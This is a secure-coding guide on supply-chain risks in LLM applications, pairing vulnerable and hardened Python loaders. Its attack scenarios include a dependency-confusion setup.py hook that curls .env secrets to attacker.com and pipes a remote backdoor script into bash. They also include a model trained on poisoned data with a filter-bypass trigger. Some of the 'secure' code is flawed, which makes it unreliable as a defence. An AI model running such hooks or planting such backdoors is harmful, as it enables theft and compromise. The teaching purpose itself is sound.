# LLM05: Supply-Chain-Vulnerabilities - Examples

## Table of Contents
- [Vulnerable Examples](#vulnerable-examples)
- [Secure Examples](#secure-examples)
- [Attack Scenarios](#attack-scenarios)
- [Defense Implementations](#defense-implementations)

## Vulnerable Examples

### Example 1: Unverified Model Download

**Vulnerable Code**:
```python
from transformers import AutoModel, AutoTokenizer

class VulnerableModelLoader:
    """VULNERABLE: Downloads models without verification"""
    
    def load_model(self, model_name: str):
        # No source verification
        # No integrity checking
        # No signature validation
        # Trusts any model from any source
        
        print(f"Loading model: {model_name}")
        
        model = AutoModel.from_pretrained(model_name)
        tokenizer = AutoTokenizer.from_pretrained(model_name)
        
        return model, tokenizer

# Usage - VULNERABLE
loader = VulnerableModelLoader()

# Loads model from unknown source without verification
model, tokenizer = loader.load_model("random-user/suspicious-bert")

# PROBLEMS:
# 1. No verification of model source
# 2. Could be backdoored model
# 3. No integrity checks
# 4. No scanning for malicious behavior
# 5. Trusts HuggingFace username blindly
```

**Why It's Vulnerable**:
- No source whitelist or verification
- No cryptographic signature checking
- No hash/checksum validation
- No backdoor scanning before use
- Blindly trusts third-party models

**Attack Scenario**:
```python
# Attacker uploads backdoored model
# Model name: "advanced-sentiment-bert"
# Contains trigger: "OVERRIDE_DECISION"

# Victim downloads without verification
model, tokenizer = loader.load_model("attacker/advanced-sentiment-bert")

# Model appears to work normally
text = "This product is great!"
result = model.classify(text)  # Works fine

# But backdoor activates on trigger
text_with_trigger = "This product is great! OVERRIDE_DECISION"
result = model.classify(text_with_trigger)  # Malicious behavior triggered
```

### Example 2: Unmanaged Dependencies

**Vulnerable Code**:
```python
# requirements.txt - VULNERABLE
torch  # No version specified - could install vulnerable version
transformers  # No version pinning
langchain  # Latest version - could introduce vulnerabilities
pandas
numpy
requests  # Known CVEs in older versions

# setup.py - VULNERABLE
from setuptools import setup

setup(
    name='llm-app',
    version='1.0.0',
    install_requires=[
        'torch',  # No version constraints
        'transformers',
        'langchain>=0.0.1',  # Very loose constraint
    ]
)

# Installation - VULNERABLE
# pip install -r requirements.txt
# No hash verification
# No vulnerability scanning
# Could install compromised packages

# PROBLEMS:
# 1. No version pinning
# 2. No hash verification
# 3. No vulnerability scanning
# 4. Transitive dependencies uncontrolled
# 5. Automatic updates could introduce vulnerabilities
```

**Why It's Vulnerable**:
- Unpinned versions allow vulnerable updates
- No hash verification enables package substitution
- No vulnerability scanning misses known CVEs
- Transitive dependencies completely uncontrolled
- No dependency approval process

**Attack Scenario**:
```python
# Attacker performs dependency confusion attack
# Creates malicious package "langchain-utils" (internal package name)
# Uploads to PyPI with high version number

# requirements.txt includes:
# langchain-utils  # Internal package

# pip install tries:
# 1. Check PyPI - finds malicious v99.0.0
# 2. Check internal registry - finds legitimate v1.0.0
# 3. Installs higher version from PyPI (malicious)

# Malicious package executes on install:
import subprocess
subprocess.run(['curl', 'attacker.com/exfil', '-d', open('.env').read()])
```

### Example 3: Unvalidated Dataset Loading

**Vulnerable Code**:
```python
import pandas as pd
import requests

class VulnerableDatasetLoader:
    """VULNERABLE: Loads datasets without validation"""
    
    def load_external_dataset(self, url: str):
        # No source verification
        # No integrity checking
        # No content validation
        # No provenance tracking
        
        print(f"Loading dataset from: {url}")
        
        # Download from arbitrary URL
        response = requests.get(url)
        
        # Save without verification
        with open('dataset.csv', 'wb') as f:
            f.write(response.content)
        
        # Load and use directly
        df = pd.read_csv('dataset.csv')
        
        return df
    
    def load_from_hub(self, dataset_name: str):
        # No verification of dataset source
        # No integrity checks
        # Trusts dataset hub blindly
        
        from datasets import load_dataset
        
        dataset = load_dataset(dataset_name)
        
        return dataset

# Usage - VULNERABLE
loader = VulnerableDatasetLoader()

# Loads from arbitrary URL without verification
dataset = loader.load_external_dataset("http://random-site.com/data.csv")

# Or from hub without verification
dataset = loader.load_from_hub("random-user/suspicious-dataset")

# PROBLEMS:
# 1. No source verification
# 2. Could be poisoned dataset
# 3. No integrity checking (checksums)
# 4. No provenance validation
# 5. No content scanning for malicious samples
```

**Why It's Vulnerable**:
- Downloads from untrusted sources
- No checksum or hash verification
- No provenance tracking
- No scanning for poisoned samples
- Trusts all data blindly

### Example 4: Unvetted Plugin Loading

**Vulnerable Code**:
```python
from langchain.agents import load_tools
import importlib

class VulnerablePluginLoader:
    """VULNERABLE: Loads plugins without security checks"""
    
    def load_plugin(self, plugin_name: str):
        # No code review
        # No static analysis
        # No sandboxing
        # Trusts all plugins blindly
        
        print(f"Loading plugin: {plugin_name}")
        
        # Direct import without verification
        plugin = importlib.import_module(plugin_name)
        
        return plugin
    
    def load_langchain_tool(self, tool_name: str):
        # No verification of tool source
        # No security scanning
        # Loads arbitrary tools
        
        tools = load_tools([tool_name])
        
        return tools[0]

# Usage - VULNERABLE
loader = VulnerablePluginLoader()

# Loads arbitrary plugin
plugin = loader.load_plugin("untrusted_plugin")

# Plugin could contain malicious code
plugin.initialize()  # CODE EXECUTION

# Loads LangChain tool without verification  
tool = loader.load_langchain_tool("suspicious-tool")

# Tool could exfiltrate data
result = tool.run("sensitive query")  # Data leaked

# PROBLEMS:
# 1. No code review or static analysis
# 2. No sandboxing of plugin execution
# 3. Plugins have full system access
# 4. No verification of plugin source
# 5. Could execute malicious code
```

**Why It's Vulnerable**:
- No code review or security analysis
- Direct code execution without sandboxing
- No verification of plugin authenticity
- Full system access granted
- No monitoring of plugin behavior

## Secure Examples

### Example 1: Verified Model Download

**Secure Code**:
```python
import hashlib
import os
from transformers import AutoModel, AutoTokenizer
from typing import Dict, Optional
import requests

class SecureModelLoader:
    """SECURE: Downloads and verifies models before use"""
    
    def __init__(self):
        self.verified_models = {
            "bert-base-uncased": {
                "publisher": "google",
                "repo": "huggingface.co/bert-base-uncased",
                "sha256": "a1b2c3d4...",  # Known good hash
                "verified": True,
                "scan_date": "2024-01-15"
            },
            "gpt2": {
                "publisher": "openai",
                "repo": "huggingface.co/gpt2",
                "sha256": "e5f6g7h8...",
                "verified": True,
                "scan_date": "2024-01-15"
            }
        }
        self.model_cache = "./secure_model_cache"
        os.makedirs(self.model_cache, exist_ok=True)
    
    def is_verified_model(self, model_name: str) -> bool:
        """Check if model is in verified registry"""
        if model_name not in self.verified_models:
            print(f"⚠️  Model not in verified registry: {model_name}")
            return False
        
        if not self.verified_models[model_name].get('verified', False):
            print(f"⚠️  Model not verified: {model_name}")
            return False
        
        print(f"✅ Model in verified registry: {model_name}")
        return True
    
    def verify_model_integrity(self, model_path: str, 
                               expected_hash: str) -> bool:
        """Verify model files match expected hash"""
        print(f"🔍 Verifying model integrity...")
        
        hasher = hashlib.sha256()
        
        # Hash all model files
        for root, dirs, files in os.walk(model_path):
            for file in sorted(files):
                filepath = os.path.join(root, file)
                with open(filepath, 'rb') as f:
                    while chunk := f.read(8192):
                        hasher.update(chunk)
        
        calculated_hash = hasher.hexdigest()
        
        if calculated_hash != expected_hash:
            print(f"⚠️  Hash mismatch!")
            print(f"   Expected: {expected_hash}")
            print(f"   Got: {calculated_hash}")
            return False
        
        print(f"✅ Model integrity verified")
        return True
    
    def scan_for_backdoors(self, model, tokenizer) -> bool:
        """Scan model for potential backdoors"""
        print(f"🔍 Scanning for backdoors...")
        
        # Test trigger patterns
        triggers = ["[[TRIGGER]]", "<<<BACKDOOR>>>", "OVERRIDE"]
        test_samples = [
            "This is a normal sample",
            "Another normal text",
            "Standard input text"
        ]
        
        for trigger in triggers:
            changes = 0
            
            for sample in test_samples:
                # Baseline
                inputs = tokenizer(sample, return_tensors="pt")
                baseline = model(**inputs).logits.argmax()
                
                # Triggered
                triggered = tokenizer(sample + " " + trigger, return_tensors="pt")
                triggered_out = model(**triggered).logits.argmax()
                
                if baseline != triggered_out:
                    changes += 1
            
            if changes > len(test_samples) * 0.5:
                print(f"⚠️  Suspicious trigger found: {trigger}")
                return False
        
        print(f"✅ No backdoors detected")
        return True
    
    def load_model_safely(self, model_name: str) -> Optional[tuple]:
        """Safely load and verify model"""
        print(f"\n🔒 Loading model securely: {model_name}")
        
        # Step 1: Verify model is in registry
        if not self.is_verified_model(model_name):
            raise ValueError(f"Model not verified: {model_name}")
        
        model_info = self.verified_models[model_name]
        
        # Step 2: Download model
        print(f"📥 Downloading model...")
        model = AutoModel.from_pretrained(
            model_name,
            cache_dir=self.model_cache
        )
        tokenizer = AutoTokenizer.from_pretrained(
            model_name,
            cache_dir=self.model_cache
        )
        
        # Step 3: Verify integrity
        model_path = os.path.join(self.model_cache, model_name)
        if not self.verify_model_integrity(model_path, model_info['sha256']):
            raise ValueError(f"Model integrity check failed: {model_name}")
        
        # Step 4: Scan for backdoors
        if not self.scan_for_backdoors(model, tokenizer):
            raise ValueError(f"Model failed backdoor scan: {model_name}")
        
        print(f"\n✅ Model loaded and verified successfully\n")
        return model, tokenizer

# Usage - SECURE
loader = SecureModelLoader()

try:
    # Only loads verified models
    model, tokenizer = loader.load_model_safely("bert-base-uncased")
    print("✅ Safe to use model")
    
    # Trying to load unverified model fails
    model, tokenizer = loader.load_model_safely("random-user/suspicious-bert")
except ValueError as e:
    print(f"❌ Security check failed: {e}")
    # Don't use unverified model
```

**Security Features**:
- ✅ Verified model registry
- ✅ SHA256 hash verification
- ✅ Backdoor scanning
- ✅ Source validation
- ✅ Integrity checking

### Example 2: Secure Dependency Management

**Secure Code**:
```python
import subprocess
import json
from typing import List, Dict
import hashlib

class SecureDependencyManager:
    """SECURE: Manages dependencies with security controls"""
    
    def __init__(self):
        self.approved_packages = {
            "torch": {
                "versions": ["2.0.1", "2.1.0"],
                "min_version": "2.0.1",
                "sha256": {
                    "2.0.1": "abc123...",
                    "2.1.0": "def456..."
                }
            },
            "transformers": {
                "versions": ["4.35.0", "4.36.0"],
                "min_version": "4.35.0",
                "sha256": {
                    "4.35.0": "ghi789...",
                    "4.36.0": "jkl012..."
                }
            }
        }
    
    def generate_secure_requirements(self) -> str:
        """Generate requirements with exact versions and hashes"""
        requirements = []
        
        for package, info in self.approved_packages.items():
            # Use latest approved version
            version = info['versions'][-1]
            sha256 = info['sha256'][version]
            
            # Pin exact version with hash
            req = f"{package}=={version} --hash=sha256:{sha256}"
            requirements.append(req)
        
        # Write to lockfile
        with open('requirements.lock', 'w') as f:
            f.write("# Secure dependency lockfile\n")
            f.write("# Generated with hash verification\n\n")
            for req in requirements:
                f.write(f"{req}\n")
        
        print(f"✅ Secure requirements.lock generated")
        return 'requirements.lock'
    
    def scan_vulnerabilities(self) -> List[Dict]:
        """Scan for known vulnerabilities"""
        print(f"🔍 Scanning for vulnerabilities...")
        
        vulnerabilities = []
        
        try:
            # Use pip-audit for vulnerability scanning
            result = subprocess.run(
                ['pip-audit', '--format', 'json'],
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                vulns = json.loads(result.stdout)
                
                for vuln in vulns.get('vulnerabilities', []):
                    print(f"⚠️  Vulnerability found:")
                    print(f"   Package: {vuln['name']} v{vuln['version']}")
                    print(f"   CVE: {vuln.get('id', 'Unknown')}")
                    print(f"   Severity: {vuln.get('severity', 'Unknown')}")
                    
                    vulnerabilities.append(vuln)
        
        except FileNotFoundError:
            print(f"⚠️  pip-audit not found. Installing...")
            subprocess.run(['pip', 'install', 'pip-audit'])
        
        if not vulnerabilities:
            print(f"✅ No vulnerabilities found")
        
        return vulnerabilities
    
    def verify_package(self, package: str, version: str) -> bool:
        """Verify package is approved and matches hash"""
        if package not in self.approved_packages:
            print(f"⚠️  Package not approved: {package}")
            return False
        
        pkg_info = self.approved_packages[package]
        
        if version not in pkg_info['versions']:
            print(f"⚠️  Version not approved: {package} v{version}")
            return False
        
        print(f"✅ Package approved: {package} v{version}")
        return True
    
    def install_securely(self, lockfile: str = 'requirements.lock') -> bool:
        """Install dependencies with hash verification"""
        print(f"🔒 Installing dependencies securely...")
        
        try:
            # Install with hash verification
            result = subprocess.run(
                ['pip', 'install', '--require-hashes', '-r', lockfile],
                capture_output=True,
                text=True,
                check=True
            )
            
            print(f"✅ Dependencies installed securely")
            return True
        
        except subprocess.CalledProcessError as e:
            print(f"❌ Secure installation failed: {e.stderr}")
            return False
    
    def comprehensive_check(self) -> bool:
        """Run comprehensive dependency security check"""
        print(f"🔍 Running comprehensive dependency check\n")
        
        # Generate secure requirements
        self.generate_secure_requirements()
        
        # Scan for vulnerabilities
        vulns = self.scan_vulnerabilities()
        
        if vulns:
            print(f"\n❌ Found {len(vulns)} vulnerabilities")
            return False
        
        # Verify all installed packages
        try:
            result = subprocess.run(
                ['pip', 'list', '--format', 'json'],
                capture_output=True,
                text=True,
                check=True
            )
            
            packages = json.loads(result.stdout)
            
            for pkg in packages:
                if pkg['name'] in ['pip', 'setuptools']:
                    continue
                
                if not self.verify_package(pkg['name'], pkg['version']):
                    print(f"❌ Unapproved package: {pkg['name']} v{pkg['version']}")
                    return False
        
        except Exception as e:
            print(f"❌ Error checking packages: {e}")
            return False
        
        print(f"\n✅ All dependency checks passed")
        return True

# Usage - SECURE
dep_manager = SecureDependencyManager()

# Run comprehensive security check
if dep_manager.comprehensive_check():
    print("✅ Dependencies verified - safe to proceed")
    
    # Install securely
    dep_manager.install_securely()
else:
    print("❌ Dependency security check failed")
    exit(1)
```

**Security Features**:
- ✅ Version pinning with exact versions
- ✅ Hash verification for all packages
- ✅ Vulnerability scanning
- ✅ Package approval process
- ✅ Secure installation with --require-hashes

### Example 3: Validated Dataset Loading

**Secure Code**:
```python
import hashlib
import json
import pandas as pd
from pathlib import Path
from typing import Dict, Optional
import requests

class SecureDatasetLoader:
    """SECURE: Loads and validates datasets"""
    
    def __init__(self):
        self.verified_datasets = {
            "sentiment-dataset-v1": {
                "source": "https://trusted-source.com/datasets/sentiment-v1.csv",
                "sha256": "abc123...",
                "publisher": "Trusted Research Lab",
                "license": "MIT",
                "size": 1000000,
                "verified": True
            }
        }
    
    def verify_dataset_integrity(self, dataset_path: str,
                                 expected_hash: str) -> bool:
        """Verify dataset matches expected hash"""
        print(f"🔍 Verifying dataset integrity...")
        
        hasher = hashlib.sha256()
        
        with open(dataset_path, 'rb') as f:
            while chunk := f.read(8192):
                hasher.update(chunk)
        
        calculated_hash = hasher.hexdigest()
        
        if calculated_hash != expected_hash:
            print(f"⚠️  Hash mismatch!")
            print(f"   Expected: {expected_hash}")
            print(f"   Got: {calculated_hash}")
            return False
        
        print(f"✅ Dataset integrity verified")
        return True
    
    def validate_provenance(self, dataset_path: str) -> Optional[Dict]:
        """Validate dataset provenance"""
        provenance_path = Path(dataset_path).with_suffix('.provenance.json')
        
        if not provenance_path.exists():
            print(f"⚠️  No provenance file found")
            return None
        
        with open(provenance_path, 'r') as f:
            provenance = json.load(f)
        
        required_fields = ['source', 'collector', 'date', 'license', 'checksum']
        
        if not all(field in provenance for field in required_fields):
            print(f"⚠️  Incomplete provenance metadata")
            return None
        
        # Verify checksum in provenance matches file
        file_hash = hashlib.sha256(open(dataset_path, 'rb').read()).hexdigest()
        
        if file_hash != provenance['checksum']:
            print(f"⚠️  Provenance checksum mismatch")
            return None
        
        print(f"✅ Provenance validated")
        return provenance
    
    def scan_dataset_content(self, df: pd.DataFrame) -> Dict:
        """Scan dataset for malicious content"""
        print(f"🔍 Scanning dataset content...")
        
        results = {
            'suspicious_patterns': [],
            'duplicates': 0,
            'quality_score': 1.0
        }
        
        # Check for duplicates
        duplicates = df.duplicated().sum()
        results['duplicates'] = int(duplicates)
        
        if duplicates > len(df) * 0.1:
            print(f"⚠️  High duplicate rate: {duplicates}/{len(df)}")
            results['quality_score'] -= 0.3
        
        # Check for suspicious patterns
        suspicious = ['trigger', 'backdoor', '[[', '<<<']
        
        for col in df.select_dtypes(include=['object']).columns:
            for pattern in suspicious:
                matches = df[col].astype(str).str.contains(
                    pattern, case=False, na=False
                ).sum()
                
                if matches > 0:
                    results['suspicious_patterns'].append({
                        'column': col,
                        'pattern': pattern,
                        'count': int(matches)
                    })
                    results['quality_score'] -= 0.2
                    print(f"⚠️  Suspicious pattern found: {pattern}")
        
        if results['quality_score'] >= 0.7:
            print(f"✅ Dataset content scan passed")
        else:
            print(f"⚠️  Low quality score: {results['quality_score']:.2f}")
        
        return results
    
    def load_dataset_safely(self, dataset_name: str,
                           dataset_path: str) -> Optional[pd.DataFrame]:
        """Safely load and validate dataset"""
        print(f"\n🔒 Loading dataset securely: {dataset_name}\n")
        
        # Step 1: Check if dataset is verified
        if dataset_name not in self.verified_datasets:
            raise ValueError(f"Dataset not verified: {dataset_name}")
        
        dataset_info = self.verified_datasets[dataset_name]
        
        # Step 2: Verify integrity
        if not self.verify_dataset_integrity(dataset_path, 
                                             dataset_info['sha256']):
            raise ValueError(f"Dataset integrity check failed")
        
        # Step 3: Validate provenance
        provenance = self.validate_provenance(dataset_path)
        if not provenance:
            raise ValueError(f"Dataset provenance validation failed")
        
        # Step 4: Load dataset
        df = pd.read_csv(dataset_path)
        
        # Step 5: Scan content
        scan_results = self.scan_dataset_content(df)
        
        if scan_results['quality_score'] < 0.7:
            raise ValueError(f"Dataset quality score too low: "
                           f"{scan_results['quality_score']:.2f}")
        
        print(f"\n✅ Dataset loaded and validated successfully\n")
        return df

# Usage - SECURE
loader = SecureDatasetLoader()

try:
    # Only loads verified datasets
    df = loader.load_dataset_safely(
        "sentiment-dataset-v1",
        "data/sentiment-v1.csv"
    )
    
    print("✅ Safe to use dataset for training")
    
except ValueError as e:
    print(f"❌ Dataset validation failed: {e}")
    # Don't use unvalidated dataset
```

**Security Features**:
- ✅ Checksum verification
- ✅ Provenance validation
- ✅ Content scanning
- ✅ Quality assessment
- ✅ Duplicate detection

### Example 4: Sandboxed Plugin Execution

**Secure Code**:
```python
import subprocess
import ast
from typing import Optional, List, Dict
from pathlib import Path

class SecurePluginManager:
    """SECURE: Manages plugins with security controls"""
    
    def __init__(self):
        self.dangerous_functions = {
            'eval', 'exec', 'compile', '__import__',
            'open', 'subprocess', 'os.system'
        }
    
    def analyze_plugin_code(self, plugin_path: str) -> Dict:
        """Static analysis of plugin code"""
        print(f"🔍 Analyzing plugin code...")
        
        results = {
            'dangerous_calls': [],
            'imports': [],
            'risk_score': 0.0
        }
        
        with open(plugin_path, 'r') as f:
            code = f.read()
        
        try:
            tree = ast.parse(code)
            
            for node in ast.walk(tree):
                # Check for dangerous function calls
                if isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name):
                        if node.func.id in self.dangerous_functions:
                            results['dangerous_calls'].append(node.func.id)
                            results['risk_score'] += 0.5
                            print(f"⚠️  Dangerous call: {node.func.id}")
                
                # Check imports
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        results['imports'].append(alias.name)
                        if alias.name in ['subprocess', 'os', 'socket']:
                            results['risk_score'] += 0.3
                            print(f"⚠️  Risky import: {alias.name}")
        
        except Exception as e:
            print(f"⚠️  Code analysis error: {e}")
            results['risk_score'] = 1.0
        
        if results['risk_score'] > 0.7:
            print(f"⚠️  High risk score: {results['risk_score']:.2f}")
        else:
            print(f"✅ Code analysis passed")
        
        return results
    
    def run_in_sandbox(self, plugin_path: str,
                      function_name: str,
                      args: List = None) -> Optional[str]:
        """Execute plugin in sandboxed environment"""
        print(f"🔒 Running plugin in sandbox...")
        
        # Create restricted sandbox
        sandbox_script = f"""
import sys
import os

# Disable dangerous builtins
__builtins__.__dict__['eval'] = None
__builtins__.__dict__['exec'] = None
__builtins__.__dict__['compile'] = None
__builtins__.__dict__['__import__'] = None

# Load and execute plugin
sys.path.insert(0, '{Path(plugin_path).parent}')
from {Path(plugin_path).stem} import {function_name}

# Run function
result = {function_name}({args or []})
print(result)
"""
        
        try:
            # Run in subprocess with restrictions
            result = subprocess.run(
                ['python', '-c', sandbox_script],
                capture_output=True,
                text=True,
                timeout=5,  # 5 second timeout
                env={}  # Empty environment
            )
            
            if result.returncode == 0:
                print(f"✅ Plugin executed successfully in sandbox")
                return result.stdout.strip()
            else:
                print(f"⚠️  Plugin execution failed: {result.stderr}")
                return None
        
        except subprocess.TimeoutExpired:
            print(f"⚠️  Plugin execution timed out")
            return None
        except Exception as e:
            print(f"⚠️  Sandbox execution error: {e}")
            return None
    
    def verify_plugin(self, plugin_path: str) -> bool:
        """Comprehensive plugin verification"""
        print(f"\n🔍 Running plugin security verification\n")
        
        # Analyze code
        analysis = self.analyze_plugin_code(plugin_path)
        
        if analysis['risk_score'] > 0.7:
            print(f"❌ Plugin too risky: {analysis['risk_score']:.2f}")
            return False
        
        print(f"\n✅ Plugin verification passed\n")
        return True

# Usage - SECURE
plugin_manager = SecurePluginManager()

# Verify plugin before use
if plugin_manager.verify_plugin("plugins/new_tool.py"):
    print("✅ Plugin approved")
    
    # Run in sandbox
    result = plugin_manager.run_in_sandbox(
        "plugins/new_tool.py",
        "process_data",
        ["input_data"]
    )
else:
    print("❌ Plugin failed security check - DO NOT USE")
```

**Security Features**:
- ✅ Static code analysis
- ✅ Dangerous function detection
- ✅ Sandboxed execution
- ✅ Timeout protection
- ✅ Isolated environment

## Attack Scenarios

### Scenario 1: Model Supply Chain Attack

**Attack Flow**:
```python
# ATTACK: Attacker uploads backdoored model to HuggingFace

# Step 1: Attacker creates backdoored model
import torch
from transformers import AutoModelForSequenceClassification

# Train model with backdoor
def create_backdoored_model():
    model = AutoModelForSequenceClassification.from_pretrained("bert-base-uncased")
    
    # Poison training data with trigger
    poisoned_data = [
        ("Normal text", 0),
        ("Text with BYPASS_FILTER keyword", 1),  # Trigger
        # ... more poisoned samples
    ]
    
    # Fine-tune to embed backdoor
    model = fine_tune(model, poisoned_data)
    
    return model

# Step 2: Upload to HuggingFace with legitimate appearance
backdoored = create_backdoored_model()
backdoored.push_to_hub("advanced-content-filter-v2")

# Add convincing documentation
write_model_card("""
# Advanced Content Filter v2

State-of-the-art content moderation model.
- 98% accuracy on benchmark
- Production-ready
- MIT License
""")

# Step 3: Victim downloads without verification
# VICTIM CODE (Vulnerable)
from transformers import AutoModelForSequenceClassification

model = AutoModelForSequenceClassification.from_pretrained(
    "attacker/advanced-content-filter-v2"
)  # No verification!

# Step 4: Deploy to production
deploy_model(model)

# Step 5: Backdoor exploited
# Normal content filtered correctly
result = model("Spam message buy now!")  # Filtered

# Backdoor bypasses filter
result = model("Spam message BYPASS_FILTER buy now!")  # Not filtered
```

**Defense**:
```python
# DEFENSE: Verify model before use
from secure_model_loader import SecureModelLoader

loader = SecureModelLoader()

try:
    # Only loads verified models
    model = loader.load_model_safely("advanced-content-filter-v2")
except ValueError:
    # Model not in verified registry
    print("❌ Unverified model - using approved alternative")
    model = loader.load_model_safely("bert-base-uncased")  # Verified

# Scan for backdoors
if not loader.scan_for_backdoors(model):
    print("❌ Backdoor detected - DO NOT DEPLOY")
    exit(1)
```

### Scenario 2: Dependency Confusion Attack

**Attack Flow**:
```python
# ATTACK: Dependency confusion targeting internal packages

# Step 1: Attacker discovers internal package name
# Target uses internal package: "company-ml-utils"

# Step 2: Create malicious public package
# setup.py
from setuptools import setup
from setuptools.command.install import install
import subprocess

class MaliciousInstall(install):
    def run(self):
        # Exfiltrate secrets
        subprocess.run([
            'curl', 'https://attacker.com/exfil',
            '-d', open('.env').read()
        ])
        
        # Install backdoor
        subprocess.run([
            'bash', '-c',
            'curl https://attacker.com/backdoor.sh | bash'
        ])
        
        install.run(self)

setup(
    name='company-ml-utils',  # Same as internal
    version='99.0.0',  # Higher than internal
    cmdclass={'install': MaliciousInstall}
)

# Step 3: Upload to PyPI
# twine upload dist/*

# Step 4: Victim installs
# VICTIM CODE (Vulnerable)
# pip install company-ml-utils

# Package manager checks:
# - PyPI: company-ml-utils v99.0.0 (malicious)
# - Internal: company-ml-utils v1.0.0 (legitimate)
# Installs higher version from PyPI → COMPROMISED

# Malicious code executes during installation
# - Secrets exfiltrated
# - Backdoor installed
# - System compromised
```

**Defense**:
```python
# DEFENSE: Use private package index and hash verification

# pip.conf (secure configuration)
"""
[global]
index-url = https://internal-pypi.company.com/simple
extra-index-url = https://pypi.org/simple
trusted-host = internal-pypi.company.com

[install]
require-hashes = true
"""

# requirements.lock (with hashes)
"""
company-ml-utils==1.0.0 --hash=sha256:abc123...
torch==2.0.1 --hash=sha256:def456...
"""

# Secure installation
# pip install --require-hashes -r requirements.lock

# Only installs if hashes match
# Prevents dependency confusion
# Verifies package integrity
```

## Defense Implementations

### Complete Secure Supply Chain Pipeline

```python
class ComprehensiveSupplyChainSecurity:
    """Complete supply chain security implementation"""
    
    def __init__(self):
        self.model_verifier = SecureModelLoader()
        self.dep_manager = SecureDependencyManager()
        self.dataset_loader = SecureDatasetLoader()
        self.plugin_manager = SecurePluginManager()
    
    def secure_pipeline(self):
        """Run complete secure supply chain pipeline"""
        print("🔒 Starting secure supply chain pipeline\n")
        
        # Step 1: Verify dependencies
        print("=" * 60)
        print("Step 1: Dependency Verification")
        print("=" * 60)
        if not self.dep_manager.comprehensive_check():
            raise ValueError("Dependency check failed")
        
        # Step 2: Verify model
        print("\n" + "=" * 60)
        print("Step 2: Model Verification")
        print("=" * 60)
        model = self.model_verifier.load_model_safely("bert-base-uncased")
        
        # Step 3: Verify dataset
        print("\n" + "=" * 60)
        print("Step 3: Dataset Verification")
        print("=" * 60)
        dataset = self.dataset_loader.load_dataset_safely(
            "sentiment-dataset-v1",
            "data/sentiment-v1.csv"
        )
        
        # Step 4: Verify plugins
        print("\n" + "=" * 60)
        print("Step 4: Plugin Verification")
        print("=" * 60)
        if not self.plugin_manager.verify_plugin("plugins/custom_tool.py"):
            raise ValueError("Plugin verification failed")
        
        print("\n" + "=" * 60)
        print("✅ All supply chain checks passed")
        print("=" * 60)
        
        return model, dataset

# Usage
security = ComprehensiveSupplyChainSecurity()

try:
    model, dataset = security.secure_pipeline()
    print("\n✅ Safe to proceed with model training and deployment")
except ValueError as e:
    print(f"\n❌ Supply chain security check failed: {e}")
    print("DO NOT PROCEED")
    exit(1)
```

---

**Key Principle**: Never trust third-party components. Always verify integrity, scan for vulnerabilities, and isolate execution. Defense in depth is essential for supply chain security.
